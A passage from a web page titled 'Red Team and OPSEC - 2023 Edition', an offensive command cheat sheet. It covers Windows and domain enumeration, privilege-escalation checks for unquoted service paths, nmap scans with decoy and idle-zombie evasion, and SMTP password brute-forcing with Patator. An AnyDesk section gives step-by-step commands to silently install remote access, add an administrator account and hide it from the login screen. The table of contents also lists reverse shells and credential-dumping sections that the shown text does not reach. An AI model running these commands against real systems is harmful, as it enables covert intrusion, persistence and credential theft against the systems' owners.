<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Red Team and OPSEC - 2023 Edition - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Red Team and OPSEC - 2023 Edition", url: "#_top", children: [
              {title: "Basic System Info", url: "#basic-system-info" },
              {title: "Hotfix Information", url: "#hotfix-information" },
              {title: "User \u0026amp; Group Information", url: "#user-group-information" },
              {title: "Network Details", url: "#network-details" },
              {title: "Privilege Information", url: "#privilege-information" },
              {title: "Data Search", url: "#data-search" },
              {title: "Process \u0026amp; Service Details", url: "#process-service-details" },
              {title: "Network Connections", url: "#network-connections" },
              {title: "Directory Access", url: "#directory-access" },
              {title: "Domain \u0026amp; Forest Info (PowerShell)", url: "#domain-forest-info-powershell" },
              {title: "Domain Controller and Trusts", url: "#domain-controller-and-trusts" },
              {title: "Authentication \u0026amp; Session Details", url: "#authentication-session-details" },
              {title: "Miscellaneous", url: "#miscellaneous" },
              {title: "Host Discovery", url: "#host-discovery" },
              {title: "Top Ports Scan", url: "#top-ports-scan" },
              {title: "Full Range Port Scan", url: "#full-range-port-scan" },
              {title: "Extract Open Ports", url: "#extract-open-ports" },
              {title: "Service and OS Detection", url: "#service-and-os-detection" },
              {title: "Evasion Techniques", url: "#evasion-techniques" },
              {title: "AnyDesk OPSEC Usage", url: "#anydesk-opsec-usage" },
          ]},
          {title: "", url: "#_1", children: [
          ]},
          {title: "Web Path Scanner and Brute Force Tools", url: "#web-path-scanner-and-brute-force-tools", children: [
              {title: "Web Path Scanners:", url: "#web-path-scanners" },
              {title: "Brute Force with Patator:", url: "#brute-force-with-patator" },
              {title: "DNS Enumeration with Fierce:", url: "#dns-enumeration-with-fierce" },
              {title: "Web Service Scanning with Nikto:", url: "#web-service-scanning-with-nikto" },
              {title: "WordPress Scan with WPScan:", url: "#wordpress-scan-with-wpscan" },
              {title: "HTTP Fingerprint Identification with Httprint:", url: "#http-fingerprint-identification-with-httprint" },
              {title: "Web Application Security Scanning with Skipfish:", url: "#web-application-security-scanning-with-skipfish" },
              {title: "Network Scanning and Enumeration:", url: "#network-scanning-and-enumeration" },
              {title: "Enumeration and Windows Commands:", url: "#enumeration-and-windows-commands" },
              {title: "Tunneling and Port Forwarding:", url: "#tunneling-and-port-forwarding" },
          ]},
          {title: "Password Hash Gathering and Cracking", url: "#password-hash-gathering-and-cracking", children: [
              {title: "Gathering Password Hash:", url: "#gathering-password-hash" },
              {title: "Exploiting Hash to Gain Access:", url: "#exploiting-hash-to-gain-access" },
              {title: "Password Cracking with Hashcat:", url: "#password-cracking-with-hashcat" },
          ]},
          {title: "Using Netcat (NC) for Shell Bouncing on Windows", url: "#using-netcat-nc-for-shell-bouncing-on-windows", children: [
              {title: "Listening and Connecting with NC:", url: "#listening-and-connecting-with-nc" },
              {title: "Advanced NC Options:", url: "#advanced-nc-options" },
          ]},
          {title: "Finding SUID/SGID and Orphaned Files", url: "#finding-suidsgid-and-orphaned-files", children: [
              {title: "Locate SUID root files:", url: "#locate-suid-root-files" },
              {title: "Locate SGID root files:", url: "#locate-sgid-root-files" },
              {title: "Locate SUID and SGID files:", url: "#locate-suid-and-sgid-files" },
              {title: "Find files that do not belong to any user:", url: "#find-files-that-do-not-belong-to-any-user" },
              {title: "Locate files that do not belong to any user group:", url: "#locate-files-that-do-not-belong-to-any-user-group" },
              {title: "Find symbolic links and display their targets:", url: "#find-symbolic-links-and-display-their-targets" },
              {title: "Python Shell Escalation:", url: "#python-shell-escalation" },
          ]},
          {title: "Python, Ruby, and PHP HTTP Servers:", url: "#python-ruby-and-php-http-servers", children: [
              {title: "Python 2 HTTP Server:", url: "#python-2-http-server" },
              {title: "Python 3 HTTP Server:", url: "#python-3-http-server" },
              {title: "Ruby HTTP Server (WEBrick):", url: "#ruby-http-server-webrick" },
              {title: "PHP HTTP Server:", url: "#php-http-server" },
          ]},
          {title: "Getting Process PID:", url: "#getting-process-pid", children: [
              {title: "Find PID for a Port:", url: "#find-pid-for-a-port" },
              {title: "Kill a Process by Port:", url: "#kill-a-process-by-port" },
          ]},
          {title: "Using Hydra to Crack RDP:", url: "#using-hydra-to-crack-rdp", children: [
          ]},
          {title: "Mounting a Remote Windows Shared Folder (SMB):", url: "#mounting-a-remote-windows-shared-folder-smb", children: [
          ]},
          {title: "Compiling an Exploit in Kali:", url: "#compiling-an-exploit-in-kali", children: [
              {title: "Compile a 32-bit Executable:", url: "#compile-a-32-bit-executable" },
              {title: "Compile a 64-bit Executable:", url: "#compile-a-64-bit-executable" },
          ]},
          {title: "Compiling a Windows Exploit in Kali:", url: "#compiling-a-windows-exploit-in-kali", children: [
          ]},
          {title: "NASM (Netwide Assembler) Commands:", url: "#nasm-netwide-assembler-commands", children: [
          ]},
          {title: "SSH Penetration:", url: "#ssh-penetration", children: [
          ]},
          {title: "Using Metasploit for Penetration", url: "#using-metasploit-for-penetration", children: [
          ]},
          {title: "", url: "#_2", children: [
          ]},
          {title: "Linux commonly used security commands", url: "#linux-commonly-used-security-commands", children: [
          ]},
          {title: "Windows Buffer Overflow exploits", url: "#windows-buffer-overflow-exploits", children: [
          ]},
          {title: "COMMONLY USED BAD CHARACTERS:", url: "#commonly-used-bad-characters", children: [
          ]},
          {title: "Regular command:", url: "#regular-command", children: [
          ]},
          {title: "SEH \u2013 Structured exception handling", url: "#seh-structured-exception-handling", children: [
          ]},
          {title: "ROP (DEP)", url: "#rop-dep", children: [
          ]},
          {title: "ASLR \u2013 Address space format randomization", url: "#aslr-address-space-format-randomization", children: [
          ]},
          {title: "EGG Hunter technology", url: "#egg-hunter-technology", children: [
          ]},
          {title: "GDB Debugger commonly used commands", url: "#gdb-debugger-commonly-used-commands", children: [
          ]},
          {title: "Data", url: "#data", children: [
          ]},
          {title: "Display the register values: (Decimal,Binary,Hex)", url: "#display-the-register-values-decimalbinaryhex", children: [
          ]},
          {title: "Display the value of a specific memory address", url: "#display-the-value-of-a-specific-memory-address", children: [
          ]},
          {title: "BASH rebound Shell", url: "#bash-rebound-shell", children: [
          ]},
          {title: "PERL rebound Shell", url: "#perl-rebound-shell", children: [
          ]},
          {title: "Win platform", url: "#win-platform", children: [
          ]},
          {title: "RUBY rebound Shell", url: "#ruby-rebound-shell", children: [
          ]},
          {title: "Win platform", url: "#win-platform_1", children: [
          ]},
          {title: "PYTHON rebound Shell", url: "#python-rebound-shell", children: [
          ]},
          {title: "PHP bounce Shell", url: "#php-bounce-shell", children: [
          ]},
          {title: "JAVA rebound Shell", url: "#java-rebound-shell", children: [
          ]},
          {title: "NETCAT rebound Shell", url: "#netcat-rebound-shell", children: [
          ]},
          {title: "If the -e parameter is disabled, you can try the following command", url: "#if-the-e-parameter-is-disabled-you-can-try-the-following-command", children: [
          ]},
          {title: "If you installed the wrong version of netcat, try the following command", url: "#if-you-installed-the-wrong-version-of-netcat-try-the-following-command", children: [
          ]},
          {title: "If netcat is not available", url: "#if-netcat-is-not-available", children: [
          ]},
          {title: "Enable the X server (: 1 \u2013 listen on TCP port 6001)", url: "#enable-the-x-server-1-listen-on-tcp-port-6001", children: [
          ]},
          {title: "Remember to authorize the connection from the target IP", url: "#remember-to-authorize-the-connection-from-the-target-ip", children: [
          ]},
          {title: "Grant access", url: "#grant-access", children: [
          ]},
          {title: "Connect back to our X server on the target machine", url: "#connect-back-to-our-x-server-on-the-target-machine", children: [
          ]},
          {title: "XSS", url: "#xss", children: [
          ]},
          {title: "Metagoofil \u2013 Metadata collection tool", url: "#metagoofil-metadata-collection-tool", children: [
          ]},
          {title: "Use a DNS tunnel to bypass the firewall", url: "#use-a-dns-tunnel-to-bypass-the-firewall", children: [
          ]},
          {title: "Red-Team and Infrastructure Assessments", url: "#red-team-and-infrastructure-assessments", children: [
              {title: "External recon", url: "#external-recon" },
              {title: "O365 bruting", url: "#o365-bruting" },
              {title: "subdomain finder", url: "#subdomain-finder" },
              {title: "Cert search", url: "#cert-search" },
              {title: "search categorized expired domain", url: "#search-categorized-expired-domain" },
              {title: "Metadata", url: "#metadata" },
              {title: "Domain User Enumeration", url: "#domain-user-enumeration" },
              {title: "situational awareness", url: "#situational-awareness" },
              {title: "Network Attacks", url: "#network-attacks" },
              {title: "Bruteforce domain passwords", url: "#bruteforce-domain-passwords" },
              {title: "Non-domain joined testing", url: "#non-domain-joined-testing" },
              {title: "Domain Analysis", url: "#domain-analysis" },
              {title: "Compromise and Lateral Movement", url: "#compromise-and-lateral-movement" },
              {title: "RDP Pass the Hash", url: "#rdp-pass-the-hash" },
              {title: "Invoke the hash", url: "#invoke-the-hash" },
              {title: "Password dumping", url: "#password-dumping" },
              {title: "Post Compromise (Not opsec safe)", url: "#post-compromise-not-opsec-safe" },
              {title: "Priv Esc", url: "#priv-esc" },
              {title: "File Transfer", url: "#file-transfer" },
              {title: "Domain Fronting", url: "#domain-fronting" },
              {title: "AWL bypasses", url: "#awl-bypasses" },
          ]},
          {title: "Collection of PowerShell one-liners for red teamers and penetration testers to use at various stages of testing.", url: "#collection-of-powershell-one-liners-for-red-teamers-and-penetration-testers-to-use-at-various-stages-of-testing", children: [
          ]},
          {title: "Invoke-BypassUAC and start PowerShell prompt as Administrator [Or replace to run any other command]", url: "#invoke-bypassuac-and-start-powershell-prompt-as-administrator-or-replace-to-run-any-other-command", children: [
          ]},
          {title: "Invoke-Mimikatz: Dump credentials from memory", url: "#invoke-mimikatz-dump-credentials-from-memory", children: [
          ]},
          {title: "Import Mimikatz Module to run further commands", url: "#import-mimikatz-module-to-run-further-commands", children: [
          ]},
          {title: "Invoke-MassMimikatz: Use to dump creds on remote host [replace $env:computername with target server name(s)]", url: "#invoke-massmimikatz-use-to-dump-creds-on-remote-host-replace-envcomputername-with-target-server-names", children: [
          ]},
          {title: "PowerUp: Privilege escalation checks", url: "#powerup-privilege-escalation-checks", children: [
          ]},
          {title: "Invoke-Inveigh and log output to file", url: "#invoke-inveigh-and-log-output-to-file", children: [
          ]},
          {title: "Invoke-Kerberoast and provide Hashcat compatible hashes", url: "#invoke-kerberoast-and-provide-hashcat-compatible-hashes", children: [
          ]},
          {title: "Invoke-ShareFinder and print output to file", url: "#invoke-sharefinder-and-print-output-to-file", children: [
          ]},
          {title: "Import PowerView Module to run further commands", url: "#import-powerview-module-to-run-further-commands", children: [
          ]},
          {title: "Invoke-Bloodhound", url: "#invoke-bloodhound", children: [
          ]},
          {title: "Find GPP Passwords in SYSVOL", url: "#find-gpp-passwords-in-sysvol", children: [
          ]},
          {title: "Run Powershell prompt as a different user, without loading profile to the machine [replace DOMAIN and USER]", url: "#run-powershell-prompt-as-a-different-user-without-loading-profile-to-the-machine-replace-domain-and-user", children: [
          ]},
          {title: "Insert reg key to enable Wdigest on newer versions of Windows", url: "#insert-reg-key-to-enable-wdigest-on-newer-versions-of-windows", children: [
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h1 id="red-team-and-opsec-2023-edition">Red Team and OPSEC - 2023 Edition</h1>
<blockquote>
<p>The quieter you become, the more you are able to hear 🥷</p>
</blockquote>
<h2 id="basic-system-info">Basic System Info</h2>
<ul>
<li><code>systeminfo</code>: Show detailed configuration about the computer and OS.</li>
<li><code>hostname</code>: Display the host name of the current machine.</li>
</ul>
<h2 id="hotfix-information">Hotfix Information</h2>
<ul>
<li><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code>: List patches and hotfixes installed on the system.</li>
</ul>
<h2 id="user-group-information">User &amp; Group Information</h2>
<ul>
<li><code>net users</code>: List all user accounts.</li>
<li><code>net localgroups</code>: List all local groups.</li>
<li><code>net user hacker</code>: Show information about the user named "hacker".</li>
<li><code>net group /domain</code>: List all domain groups.</li>
</ul>
<h2 id="network-details">Network Details</h2>
<ul>
<li><code>ipconfig /all</code>: Show detailed IP configuration.</li>
<li><code>route print</code>: Display routing table.</li>
<li><code>arp -A</code>: Show ARP cache.</li>
</ul>
<h2 id="privilege-information">Privilege Information</h2>
<ul>
<li><code>whoami /priv</code>: Display user privileges.</li>
</ul>
<h2 id="data-search">Data Search</h2>
<ul>
<li><code>findstr /spin "password" *.*</code>: Recursively search for the term "password" in files.</li>
</ul>
<h2 id="process-service-details">Process &amp; Service Details</h2>
<ul>
<li><code>tasklist /SVC</code>: List running processes with service details.</li>
<li><code>sc query state= all | findstr "SERVICE_NAME:" &gt;&gt; a &amp; FOR /F "tokens=2 delims= " %i in (a) DO @echo %i &gt;&gt; b &amp; FOR /F %i in (b) DO @(@echo %i &amp; @echo --------- &amp; @sc qc %i | findstr "BINARY_PATH_NAME" &amp; @echo.) &amp; del a 2&gt;nul &amp; del b 2&gt;nul</code>: Identify unquoted service paths which can be exploited for privilege escalation.</li>
</ul>
<h2 id="network-connections">Network Connections</h2>
<ul>
<li><code>netstat -ano</code>: List network connections, ports, and associated process IDs.</li>
</ul>
<h2 id="directory-access">Directory Access</h2>
<ul>
<li><code>dir /a-r-d /s /b</code>: Search for writeable directories.</li>
</ul>
<h2 id="domain-forest-info-powershell">Domain &amp; Forest Info (PowerShell)</h2>
<ul>
<li><code>[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</code>: Get current domain details.</li>
<li><code>([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</code>: List trust relationships of current domain.</li>
<li><code>[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()</code>: Get current forest details.</li>
<li><code>([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()</code>: List trust relationships of a specific forest.</li>
</ul>
<h2 id="domain-controller-and-trusts">Domain Controller and Trusts</h2>
<ul>
<li><code>nltest /dclist:offense.local</code>: List all Domain Controllers in the specified domain.</li>
<li><code>net group "domain controllers" /domain</code>: Display domain controllers in the domain.</li>
<li><code>nltest /dsgetdc:offense.local</code>: Get Domain Controller details for a domain.</li>
<li><code>nltest /domain_trusts</code>: List all domain trusts.</li>
<li><code>nltest /user:"spotless"</code>: Fetch details for a specific user.</li>
</ul>
<h2 id="authentication-session-details">Authentication &amp; Session Details</h2>
<ul>
<li><code>set l</code>: Display local environment variables.</li>
<li><code>klist</code>: Display Kerberos tickets.</li>
<li><code>klist sessions</code>: Display all logon sessions, including NTLM.</li>
<li><code>klist tgt</code>: Display cached Kerberos TGT (Ticket Granting Ticket).</li>
</ul>
<h2 id="miscellaneous">Miscellaneous</h2>
<ul>
<li><code>whoami</code>: Display logged-in user details (useful on older systems).</li>
</ul>
<h2 id="host-discovery">Host Discovery</h2>
<p>Discover alive hosts in a network.
- <code>$ nmap -sn -T4 -oG Discovery.gnmap 192.168.1.1/24</code>: Ping scan, no port scan.
- <code>$ grep “Status: Up” Discovery.gnmap | cut -f 2 -d ‘ ‘ &gt; LiveHosts.txt</code>: Extract live hosts from the results.</p>
<h2 id="top-ports-scan">Top Ports Scan</h2>
<p>Identify most commonly used ports.
- <code>$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt</code>: TCP SYN scan.
- <code>$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt</code>: UDP scan.</p>
<h2 id="full-range-port-scan">Full Range Port Scan</h2>
<p>Full range port scanning; UDP might be slow.
- <code>$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt</code>: Common 3674 TCP ports.
- <code>$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt</code>: All TCP ports.
- <code>$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt</code>: All UDP ports.</p>
<h2 id="extract-open-ports">Extract Open Ports</h2>
<p>Commands to extract and display open TCP and UDP ports.
- <code>$ grep “open” FullTCP | cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ | xargs | sed ‘s/ /,/g’ | awk ‘{print “T:”$0}’</code>
- <code>$ grep “open” FullUDP | cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ | xargs | sed ‘s/ /,/g’ | awk ‘{print “U:”$0}’</code></p>
<h2 id="service-and-os-detection">Service and OS Detection</h2>
<p>Identify services running and OS details.
- <code>$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt</code>: Service detection.
- <code>$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</code>: OS detection.
- <code>$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt</code>: Combined OS and service detection for specific ports.</p>
<h2 id="evasion-techniques">Evasion Techniques</h2>
<p>Methods to avoid firewalls or obfuscate scan origin.</p>
<h3 id="segmentation">Segmentation</h3>
<ul>
<li><code>$ nmap -f</code>: Segmented packet scan.</li>
</ul>
<h3 id="mtu-manipulation">MTU Manipulation</h3>
<ul>
<li><code>$ nmap --mtu 24</code>: Change MTU size. It should be a multiple of 8.</li>
</ul>
<h3 id="decoy-scanning">Decoy Scanning</h3>
<p>Make it appear the scan is coming from other hosts.
- <code>$ nmap -D RND:10 [target]</code>: Randomized decoy scan.
- <code>$ nmap -D decoy1,decoy2,decoy3 [target]</code>: Manually specify decoys.</p>
<h3 id="zombie-host-scanning">Zombie Host Scanning</h3>
<p>Use idle hosts to mask scan origin.
- <code>$ nmap -sI [Zombie IP] [Target IP]</code>: Idle scan using a specific zombie.</p>
<h3 id="specified-source-port">Specified Source Port</h3>
<ul>
<li><code>$ nmap --source-port 80 [target]</code>: Scan with a specified source port (80 in this case).</li>
</ul>
<h2 id="anydesk-opsec-usage">AnyDesk OPSEC Usage</h2>
<p>This outlines the usage of AnyDesk, a commercial remote access tool utilized by threat actors for browsing victim host file systems, deploying payloads, and data exfiltration.</p>
<p><strong>Downloading and Installing AnyDesk:</strong></p>
<ol>
<li><strong>Download AnyDesk Executable:</strong></li>
<li>Download the AnyDesk executable using PowerShell.</li>
<li>
<p>Example PowerShell Script:
   <div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>  <span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="p">&lt;</span><span class="n">AnyDesk_Download_URL</span><span class="p">&gt;</span> <span class="n">-OutFile</span> <span class="s1">&#39;C:\ProgramData\AnyDesk.exe&#39;</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>Silent Installation and Password Configuration:</strong></p>
</li>
<li>Silently install AnyDesk and set an access password.</li>
<li>Commands:
   <div class="language-batch highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>  cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>  cmd.exe /c echo <span class="p">&lt;</span>Your_Password<span class="p">&gt;</span> | C:\ProgramData\AnyDesk.exe --set-password
</span></code></pre></div></li>
</ol>
<p><strong>Configuring Additional Administrator Account:</strong></p>
<ol>
<li><strong>Create an Additional Administrator Account:</strong></li>
<li>Add an administrator account with a password.</li>
<li>
<p>Command:
   <div class="language-batch highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>  net user <span class="p">&lt;</span>Username<span class="p">&gt;</span> <span class="s2">&quot;&lt;Password&gt;&quot;</span> /add
</span></code></pre></div></p>
</li>
<li>
<p><strong>Add Account to Administrators Group:</strong></p>
</li>
<li>Include the new administrator account in the Administrators group.</li>
<li>
<p>Command:
   <div class="language-batch highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>  net localgroup Administrators <span class="p">&lt;</span>Username<span class="p">&gt;</span> /ADD
</span></code></pre></div></p>
</li>
<li>
<p><strong>Hide Account from Login Screen:</strong></p>
</li>
<li>Prevent the account from appearing on the login screen.</li>
<li>Command:
   <div class="language-batch highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>  reg add <span class="s2">&quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist&quot;</span> /v <span class="p">&lt;</span>Username<span class="p">&gt;</span> /t REG_DWORD /d 0 /f
</span></code></pre></div></li>
</ol>
<p><strong>Gaining Remote Access with AnyDesk:</strong></p>
<ol>
<li><strong>Execute AnyDesk with Get-ID Parameter:</strong></li>
<li>Launch AnyDesk with the <code>--get-id</code> parameter to enable remote access.</li>
<li>Command:
   <div class="language-batch highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>  cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id
</span></code></pre></div></li>
</ol>
<h1 id="_1"></h1>
<h1 id="web-path-scanner-and-brute-force-tools">Web Path Scanner and Brute Force Tools</h1>
<h2 id="web-path-scanners">Web Path Scanners:</h2>
<h3 id="1-dirsearch">1. <strong>dirsearch</strong></h3>
<ul>
<li>A versatile directory and file brute-forcing tool.</li>
<li>Usage: <code>dirsearch [options]</code></li>
</ul>
<h3 id="2-dirbuster">2. <strong>DirBuster</strong></h3>
<ul>
<li>A GUI-based tool for directory brute-forcing.</li>
<li>Ideal for finding hidden web paths.</li>
<li>Download and usage instructions: <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">DirBuster</a></li>
</ul>
<h3 id="3-patator-password-guessing">3. <strong>Patator (Password Guessing)</strong></h3>
<ul>
<li>Patator is used for password guessing attacks across various protocols.</li>
<li>Install: <code>git clone https://github.com/lanjelot/patator.git /usr/share/patator</code></li>
</ul>
<h2 id="brute-force-with-patator">Brute Force with Patator:</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>$ patator smtp_login host=192.168.17.129 helo=&#39;ehlo 192.168.17.128&#39; user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=&#39;incorrect password or account name&#39;
</span></code></pre></div>
<h2 id="dns-enumeration-with-fierce">DNS Enumeration with Fierce:</h2>
<ul>
<li>Fierce is a DNS enumeration tool that checks for zone transfers and DNS host name enumeration.</li>
<li>Usage:
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>  $ ./fierce.pl -dns example.com
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>  $ ./fierce.pl --dns example.com --wordlist myWordList.txt
</span></code></pre></div></li>
</ul>
<h2 id="web-service-scanning-with-nikto">Web Service Scanning with Nikto:</h2>
<ul>
<li>Nikto is a web server scanner that detects vulnerabilities and misconfigurations.</li>
<li>Usage: <code>nikto -C all -h http://IP</code></li>
</ul>
<h2 id="wordpress-scan-with-wpscan">WordPress Scan with WPScan:</h2>
<ul>
<li>WPScan is a specialized tool for scanning WordPress installations.</li>
<li>Usage:
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>  git clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>  ./wpscan --url http://IP/ --enumerate p
</span></code></pre></div></li>
</ul>
<h2 id="http-fingerprint-identification-with-httprint">HTTP Fingerprint Identification with Httprint:</h2>
<ul>
<li>Httprint identifies HTTP server software and version.</li>
<li>Usage:
<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>  wget http://www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zip
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>  cd httprint_301/linux/
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>  ./httprint -h http://IP -s signatures.txt
</span></code></pre></div></li>
</ul>
<h2 id="web-application-security-scanning-with-skipfish">Web Application Security Scanning with Skipfish:</h2>
<ul>
<li>Skipfish is a comprehensive web application security detection tool.</li>
<li>It generates interactive site maps and security reports.</li>
<li>Usage:
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>  skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
</span></code></pre></div></li>
</ul>
<h2 id="network-scanning-and-enumeration">Network Scanning and Enumeration:</h2>
<h3 id="nc-netcat-scan">NC (Netcat) Scan:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a># Basic port scan on &#39;target&#39;
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>nc -v -w 1 target -z 1-1000
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a># Port scan range on a set of IP addresses
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
</span></code></pre></div>
<h3 id="unicornscan">Unicornscan:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a># Unicornscan for information gathering and security audits
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a># Scanning for all ports and services (TCP and UDP)
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>us -H -msf -Iv 192.168.56.101 -p 1-65535
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>us -H -mU -Iv 192.168.56.101 -p 1-65535
</span></code></pre></div>
<h3 id="xprobe2-for-os-fingerprinting">Xprobe2 for OS Fingerprinting:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a># Identify the operating system fingerprint on &#39;IP&#39;
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>xprobe2 -v -p tcp:80:open IP
</span></code></pre></div>
<h2 id="enumeration-and-windows-commands">Enumeration and Windows Commands:</h2>
<h3 id="samba-enumeration">Samba Enumeration:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a># Enumeration of Samba services on &#39;target&#39;
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>nmblookup -A target
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>smbclient //MOUNT/share -I target -N
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>rpcclient -U &quot;&quot; target
